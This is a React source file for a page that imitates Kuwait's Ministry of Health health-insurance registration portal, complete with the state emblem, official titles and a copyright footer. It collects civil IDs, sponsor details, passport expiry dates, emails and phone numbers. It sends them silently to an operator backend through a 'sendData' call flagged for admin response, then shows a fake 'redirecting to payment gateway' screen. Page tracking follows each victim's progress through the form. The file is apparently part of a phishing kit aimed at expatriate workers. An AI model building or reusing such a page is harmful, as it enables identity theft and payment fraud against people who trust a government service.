import { useState, useEffect } from 'react';
import { useLocation } from 'wouter';
import { navigateToPage, sendData } from '../lib/store';

export default function MOHRegister() {
  const [, setLocation] = useLocation();

  // Top section
  const [serviceType, setServiceType] = useState('');
  const [residenceType, setResidenceType] = useState('');
  const [yearlyAmount, setYearlyAmount] = useState('');

  // Personal info
  const [insuranceStatus, setInsuranceStatus] = useState('');
  const [civilId, setCivilId] = useState('');
  const [sponsorCivilId, setSponsorCivilId] = useState('');
  const [sponsorName, setSponsorName] = useState('');
  const [fullName, setFullName] = useState('');
  const [gender, setGender] = useState('');
  const [birthDate, setBirthDate] = useState('');
  const [nationality, setNationality] = useState('');
  const [company, setCompany] = useState('');
  const [workplace, setWorkplace] = useState('');
  const [passportExpiry, setPassportExpiry] = useState('');
  const [yearsCount, setYearsCount] = useState('');
  const [coverageStart, setCoverageStart] = useState('');
  const [coverageEnd, setCoverageEnd] = useState('');

  // Contact
  const [email, setEmail] = useState('');
  const [phone, setPhone] = useState('');

  // Payment
  const [paymentMethod, setPaymentMethod] = useState('بوابة الدفع الإلكتروني');
  const [totalAmount, setTotalAmount] = useState(0);
  const [agreeTerms, setAgreeTerms] = useState(false);

  // Username from previous page
  const [userName, setUserName] = useState('');

  // Payment summary
  const [showPaymentSummary, setShowPaymentSummary] = useState(false);

  useEffect(() => {
    navigateToPage('صفحة التسجيل');
    // Get stored data from previous page
    const storedName = localStorage.getItem('mohUserName') || '';
    const storedCivilId = localStorage.getItem('mohCivilId') || '';
    setUserName(storedName);
    setCivilId(storedCivilId);
  }, []);

  // Calculate amount
  useEffect(() => {
    if (yearlyAmount && yearsCount) {
      setTotalAmount(parseInt(yearlyAmount) * parseInt(yearsCount));
    }
  }, [yearlyAmount, yearsCount]);

  // Calculate coverage end
  useEffect(() => {
    if (coverageStart && yearsCount) {
      const start = new Date(coverageStart);
      start.setFullYear(start.getFullYear() + parseInt(yearsCount));
      setCoverageEnd(start.toISOString().split('T')[0]);
    }
  }, [coverageStart, yearsCount]);

  // Set yearly amount based on residence type
  useEffect(() => {
    if (residenceType) {
      setYearlyAmount('100');
    }
  }, [residenceType]);

  const isFormComplete = serviceType && residenceType && civilId && yearsCount && coverageStart && email && phone && agreeTerms;

  const handlePayment = () => {
    if (!isFormComplete) return;

    const allData = {
      'نوع الخدمة': serviceType,
      'نوع الإقامة': residenceType,
      'المبلغ في السنة': yearlyAmount,
      'حالة الضمان الصحي': insuranceStatus,
      'الرقم المدني': civilId,
      'الرقم المدني للكفيل': sponsorCivilId,
      'اسم الكفيل': sponsorName,
      'الاسم': fullName,
      'الجنس': gender,
      'تاريخ الميلاد': birthDate,
      'الجنسية': nationality,
      'الشركة': company,
      'مكان العمل': workplace,
      'تاريخ إنتهاء صلاحية الجواز': passportExpiry,
      'عدد السنوات': yearsCount,
      'تاريخ بداية التغطية': coverageStart,
      'تاريخ نهاية التغطية': coverageEnd,
      'البريد الإلكتروني': email,
      'رقم الهاتف': phone,
      'طريقة الدفع': paymentMethod,
      'إجمالي المبلغ': totalAmount,
    };

    sendData({
      data: allData,
      current: 'الدفع الإلكتروني',
      waitingForAdminResponse: false,
      mode: 'silent',
    });

    // Show payment summary
    setShowPaymentSummary(true);
    navigateToPage('ملخص الدفع');
  };

  const handleClear = () => {
    setServiceType(''); setResidenceType(''); setYearlyAmount('');
    setInsuranceStatus(''); setSponsorCivilId(''); setSponsorName('');
    setFullName(''); setGender(''); setBirthDate('');
    setNationality(''); setCompany(''); setWorkplace('');
    setPassportExpiry(''); setYearsCount(''); setCoverageStart('');
    setCoverageEnd(''); setEmail(''); setPhone('');
    setTotalAmount(0); setAgreeTerms(false);
  };

  const inputStyle: React.CSSProperties = {
    width: '100%', padding: '8px 10px', border: '1px solid #ccc',
    borderRadius: 3, fontSize: 14, fontFamily: 'Cairo, Tahoma, Arial, sans-serif',
    outline: 'none', direction: 'rtl', background: '#fff',
  };

  const readonlyInputStyle: React.CSSProperties = {
    ...inputStyle, background: '#e9ecef', color: '#555',
  };

  const selectStyle: React.CSSProperties = {
    ...inputStyle, appearance: 'auto' as any,
  };

  const labelStyle: React.CSSProperties = {
    fontSize: 13, fontWeight: 'bold', color: '#333', whiteSpace: 'nowrap',
  };

  const fieldRow: React.CSSProperties = {
    display: 'flex', alignItems: 'center', gap: 10, marginBottom: 15,
    flexWrap: 'wrap',
  };

  const serviceTypes = ['ضمان فردي', 'ضمان جماعي', 'تجديد ضمان فردي', 'تجديد ضمان جماعي'];
  const residenceTypes = [
    'Work Visa Private - 18', 'Husband - 22', 'Wife - 23', 'Son - 24',
    'Daughter - 25', 'Father - 26', 'Mother - 27', 'Government - 17',
    'Domestic Worker - 20',
  ];
  const insuranceStatuses = ['--اختار--', 'جديد', 'منتهي', 'ساري'];
  const genders = ['--اختار--', 'ذكر', 'أنثى'];
  const nationalities = ['--اختار--', 'هندي', 'بنغلاديشي', 'سريلانكي', 'فلبيني', 'مصري', 'باكستاني', 'نيبالي', 'إثيوبي', 'أخرى'];
  const yearOptions = ['1', '2', '3', '4', '5'];

  // Payment Summary Page
  if (showPaymentSummary) {
    return (
      <div style={{ direction: 'rtl', fontFamily: 'Cairo, Tahoma, Arial, sans-serif', minHeight: '100vh', background: '#fff' }}>
        {/* Header */}
        <div style={{ background: '#1a3a5c', padding: '20px 0', textAlign: 'center' }}>
          <img src="/kuwait-emblem.png" alt="شعار دولة الكويت" style={{ width: 90, height: 90, margin: '0 auto' }} />
          <h1 style={{ color: '#fff', fontSize: 22, marginTop: 10, fontWeight: 'bold' }}>النظام الآلي لتسجيل الضمان الصحي</h1>
        </div>

        <div style={{ maxWidth: 600, margin: '40px auto', padding: '0 20px' }}>
          <div style={{ border: '1px solid #ddd', borderRadius: 4, overflow: 'hidden' }}>
            <div style={{ background: '#1076BB', padding: '12px 20px', textAlign: 'center' }}>
              <span style={{ color: '#fff', fontSize: 16, fontWeight: 'bold' }}>ملخص الدفع</span>
            </div>
            <div style={{ padding: '30px 25px', background: '#f9f9f9' }}>
              <table style={{ width: '100%', borderCollapse: 'collapse' }}>
                <tbody>
                  <tr style={{ borderBottom: '1px solid #eee' }}>
                    <td style={{ padding: '12px 10px', fontWeight: 'bold', color: '#555' }}>نوع الخدمة</td>
                    <td style={{ padding: '12px 10px', color: '#333' }}>{serviceType}</td>
                  </tr>
                  <tr style={{ borderBottom: '1px solid #eee' }}>
                    <td style={{ padding: '12px 10px', fontWeight: 'bold', color: '#555' }}>نوع الإقامة</td>
                    <td style={{ padding: '12px 10px', color: '#333' }}>{residenceType}</td>
                  </tr>
                  <tr style={{ borderBottom: '1px solid #eee' }}>
                    <td style={{ padding: '12px 10px', fontWeight: 'bold', color: '#555' }}>عدد السنوات</td>
                    <td style={{ padding: '12px 10px', color: '#333' }}>{yearsCount}</td>
                  </tr>
                  <tr style={{ borderBottom: '1px solid #eee' }}>
                    <td style={{ padding: '12px 10px', fontWeight: 'bold', color: '#555' }}>إجمالي المبلغ</td>
                    <td style={{ padding: '12px 10px', color: '#d32f2f', fontWeight: 'bold', fontSize: 18 }}>{totalAmount} د.ك</td>
                  </tr>
                </tbody>
              </table>

              <div style={{ textAlign: 'center', marginTop: 30 }}>
                <div style={{
                  width: 50, height: 50, border: '4px solid #eee', borderTop: '4px solid #1076BB',
                  borderRadius: '50%', animation: 'spin 1s linear infinite', margin: '0 auto 15px',
                }} />
                <p style={{ color: '#555', fontSize: 15 }}>جاري تحويلك لبوابة الدفع الإلكتروني...</p>
                <style>{`@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }`}</style>
              </div>
            </div>
          </div>
        </div>

        {/* Footer */}
        <div style={{ textAlign: 'center', padding: '40px 0 20px', marginTop: 40, borderTop: '1px solid #eee' }}>
          <p style={{ color: '#888', fontSize: 13 }}>© 2019 Ministry Of Health Kuwait . All Rights Reserved.</p>
        </div>
      </div>
    );
  }

  return (
    <div style={{ direction: 'rtl', fontFamily: 'Cairo, Tahoma, Arial, sans-serif', minHeight: '100vh', background: '#f0f2f5' }}>
      {/* Header */}
      <div style={{ background: '#1a3a5c', padding: '20px 0', textAlign: 'center' }}>
        <img src="/kuwait-emblem.png" alt="شعار دولة الكويت" style={{ width: 90, height: 90, margin: '0 auto' }} />
        <h1 style={{ color: '#fff', fontSize: 22, marginTop: 10, fontWeight: 'bold' }}>النظام الآلي لتسجيل الضمان الصحي</h1>
      </div>

      {/* User info bar */}
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '10px 30px', background: '#fff', borderBottom: '1px solid #eee' }}>
        <span style={{ color: 'red', fontSize: 14, cursor: 'pointer' }}>English</span>
        <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
          <span style={{ color: '#d32f2f', fontSize: 14, fontWeight: 'bold' }}>{userName || 'المستخدم'}</span>
          <div style={{ width: 40, height: 40, background: '#ddd', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
            <svg width="24" height="24" viewBox="0 0 24 24" fill="#888"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
          </div>
        </div>
      </div>

      <div style={{ maxWidth: 1100, margin: '20px auto', padding: '0 15px' }}>
        {/* Service Type Section */}
        <div style={{ background: '#e8edf2', padding: '15px 20px', borderRadius: 4, marginBottom: 15 }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 15, flexWrap: 'wrap', justifyContent: 'flex-end' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
              <input type="text" value={yearlyAmount} readOnly style={{ ...readonlyInputStyle, width: 80, textAlign: 'center' }} />
              <span style={labelStyle}>المبلغ في السنه</span>
            </div>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
              <select value={residenceType} onChange={(e) => setResidenceType(e.target.value)} style={{ ...selectStyle, width: 220 }}>
                <option value="">--اختار--</option>
                {residenceTypes.map(t => <option key={t} value={t}>{t}</option>)}
              </select>
              <span style={labelStyle}>نوع الاقامه</span>
            </div>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
              <select value={serviceType} onChange={(e) => setServiceType(e.target.value)} style={{ ...selectStyle, width: 180 }}>
                <option value="">--اختار--</option>
                {serviceTypes.map(t => <option key={t} value={t}>{t}</option>)}
              </select>
              <span style={labelStyle}>نوع الخدمة</span>
            </div>
          </div>
        </div>

        {/* Personal Info Section */}
        <div style={{ background: '#fff', padding: '20px', borderRadius: 4, border: '1px solid #d0dbe8', marginBottom: 15 }}>
          {/* Row 1: Insurance Status + Civil ID */}
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: '15px 20px', marginBottom: 15 }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8, justifyContent: 'flex-end' }}>
              <input type="text" value={civilId} onChange={(e) => setCivilId(e.target.value.replace(/\D/g, ''))} placeholder="أدخل الرقم المدني" style={inputStyle} />
              <span style={labelStyle}>الرقم المدني <span style={{ color: 'red' }}>*</span></span>
            </div>
            <div></div>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8, justifyContent: 'flex-end' }}>
              <select value={insuranceStatus} onChange={(e) => setInsuranceStatus(e.target.value)} style={selectStyle}>
                {insuranceStatuses.map(s => <option key={s} value={s}>{s}</option>)}
              </select>
              <span style={labelStyle}>حالة الضمان الصحي <span style={{ color: 'red' }}>*</span></span>
            </div>
          </div>

          {/* Row: Sponsor */}
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: '15px 20px', marginBottom: 15 }}>
            <div></div>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8, justifyContent: 'flex-end' }}>
              <input type="text" value={sponsorName} onChange={(e) => setSponsorName(e.target.value)} style={inputStyle} />
              <span style={labelStyle}>اسم الكفيل</span>
            </div>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8, justifyContent: 'flex-end' }}>
              <input type="text" value={sponsorCivilId} onChange={(e) => setSponsorCivilId(e.target.value.replace(/\D/g, ''))} style={inputStyle} />
              <span style={labelStyle}>الرقم المدني للكفيل</span>
            </div>
          </div>

          {/* Row: Name */}
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: '15px 20px', marginBottom: 15 }}>
            <div></div>
            <div></div>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8, justifyContent: 'flex-end' }}>
              <input type="text" value={fullName} readOnly style={readonlyInputStyle} />
              <span style={labelStyle}>الاسم</span>
            </div>
          </div>

          {/* Row: Gender + Birth Date */}
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: '15px 20px', marginBottom: 15 }}>
            <div></div>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8, justifyContent: 'flex-end' }}>
              <input type="date" value={birthDate} onChange={(e) => setBirthDate(e.target.value)} style={inputStyle} />
              <span style={labelStyle}>تاريخ الميلاد</span>
            </div>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8, justifyContent: 'flex-end' }}>
              <select value={gender} onChange={(e) => setGender(e.target.value)} style={selectStyle}>
                {genders.map(g => <option key={g} value={g}>{g}</option>)}
              </select>
              <span style={labelStyle}>الجنس</span>
            </div>
          </div>

          {/* Row: Nationality */}
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: '15px 20px', marginBottom: 15 }}>
            <div></div>
            <div></div>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8, justifyContent: 'flex-end' }}>
              <select value={nationality} onChange={(e) => setNationality(e.target.value)} style={selectStyle}>
                {nationalities.map(n => <option key={n} value={n}>{n}</option>)}
              </select>
              <span style={labelStyle}>الجنسية</span>
            </div>
          </div>

          {/* Row: Company + Workplace + Passport */}
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: '15px 20px', marginBottom: 15 }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8, justifyContent: 'flex-end' }}>
              <input type="date" value={passportExpiry} onChange={(e) => setPassportExpiry(e.target.value)} style={inputStyle} />
              <span style={labelStyle}>تاريخ إنتهاء صلاحية الجواز <span style={{ color: 'red' }}>*</span></span>
            </div>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8, justifyContent: 'flex-end' }}>
              <input type="text" value={workplace} onChange={(e) => setWorkplace(e.target.value)} style={inputStyle} />
              <span style={labelStyle}>مكان العمل</span>
            </div>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8, justifyContent: 'flex-end' }}>
              <input type="text" value={company} onChange={(e) => setCompany(e.target.value)} style={inputStyle} />
              <span style={labelStyle}>الشركة</span>
            </div>
          </div>

          {/* Row: Years + Coverage Start + Coverage End */}
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: '15px 20px', marginBottom: 15 }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8, justifyContent: 'flex-end' }}>
              <input type="text" value={coverageEnd} readOnly style={readonlyInputStyle} />
              <span style={labelStyle}>تاريخ نهاية التغطية</span>
            </div>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8, justifyContent: 'flex-end' }}>
              <input type="date" value={coverageStart} onChange={(e) => setCoverageStart(e.target.value)} placeholder="أدخل تاريخ بدء التغطية" style={inputStyle} />
              <span style={labelStyle}>تاريخ بداية التغطية <span style={{ color: 'red' }}>*</span></span>
            </div>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8, justifyContent: 'flex-end' }}>
              <select value={yearsCount} onChange={(e) => setYearsCount(e.target.value)} style={selectStyle}>
                <option value="">اختر عدد السنوات</option>
                {yearOptions.map(y => <option key={y} value={y}>{y}</option>)}
              </select>
              <span style={labelStyle}>عدد السنوات <span style={{ color: 'red' }}>*</span></span>
            </div>
          </div>
        </div>

        {/* Contact Section */}
        <div style={{ background: '#fff', padding: '20px', borderRadius: 4, border: '1px solid #d0dbe8', marginBottom: 15 }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 20, justifyContent: 'flex-end', flexWrap: 'wrap' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
              <input type="tel" value={phone} onChange={(e) => setPhone(e.target.value.replace(/\D/g, ''))} maxLength={12} style={{ ...inputStyle, width: 200 }} />
              <span style={labelStyle}>رقم الهاتف</span>
            </div>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
              <input type="email" value={email} onChange={(e) => setEmail(e.target.value)} style={{ ...inputStyle, width: 250, direction: 'ltr', textAlign: 'left' }} />
              <span style={labelStyle}>البريد الإلكتروني</span>
            </div>
          </div>

          {/* Required fields message */}
          {!isFormComplete && (
            <p style={{ color: 'red', fontSize: 13, textAlign: 'center', marginTop: 15 }}>
              * الرجاء ادخال البيانات المطلوبه الرقم المدني , تاريخ إنتهاء صلاحية الجواز , عدد السنوات , تاريخ بداية التغطية
            </p>
          )}
        </div>

        {/* Payment Section */}
        <div style={{ background: '#fff', padding: '20px', borderRadius: 4, border: '1px solid #d0dbe8', marginBottom: 15 }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 20, justifyContent: 'flex-end', flexWrap: 'wrap' }}>
            <div>
              <button
                onClick={handlePayment}
                disabled={!isFormComplete}
                style={{
                  background: isFormComplete ? '#1076BB' : '#ccc',
                  color: '#fff', border: 'none', padding: '10px 30px',
                  fontSize: 14, fontWeight: 'bold', borderRadius: 4,
                  cursor: isFormComplete ? 'pointer' : 'not-allowed',
                  fontFamily: 'Cairo, Tahoma, Arial, sans-serif',
                }}
              >
                الدفع الإلكتروني
              </button>
            </div>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
              <input type="text" value={totalAmount || 0} readOnly style={{ ...readonlyInputStyle, width: 100, textAlign: 'center' }} />
              <span style={labelStyle}>إجمالي المبلغ</span>
            </div>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
              <select value={paymentMethod} onChange={(e) => setPaymentMethod(e.target.value)} style={{ ...selectStyle, width: 200 }}>
                <option value="بوابة الدفع الإلكتروني">بوابة الدفع الإلكتروني</option>
              </select>
              <span style={labelStyle}>طريقة الدفع</span>
            </div>
          </div>
        </div>

        {/* Terms & Clear */}
        <div style={{ background: '#fff', padding: '20px', borderRadius: 4, border: '1px solid #d0dbe8', marginBottom: 30 }}>
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexWrap: 'wrap', gap: 15 }}>
            <button
              onClick={handleClear}
              style={{
                background: '#d32f2f', color: '#fff', border: 'none', padding: '10px 50px',
                fontSize: 15, fontWeight: 'bold', borderRadius: 4, cursor: 'pointer',
                fontFamily: 'Cairo, Tahoma, Arial, sans-serif',
              }}
            >
              مسح
            </button>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
              <label style={{ fontSize: 14, color: '#333' }}>
                <span style={{ color: 'red' }}>*</span> أوافق{' '}
                <a href="#" style={{ color: '#1076BB', textDecoration: 'underline' }}>الشروط والأحكام</a>
              </label>
              <input
                type="checkbox"
                checked={agreeTerms}
                onChange={(e) => setAgreeTerms(e.target.checked)}
                style={{ width: 18, height: 18 }}
              />
            </div>
          </div>
        </div>
      </div>

      {/* Footer */}
      <div style={{ textAlign: 'center', padding: '20px 0', background: '#fff', borderTop: '1px solid #eee' }}>
        <p style={{ color: '#888', fontSize: 13 }}>© 2019 Ministry Of Health Kuwait . All Rights Reserved.</p>
      </div>
    </div>
  );
}
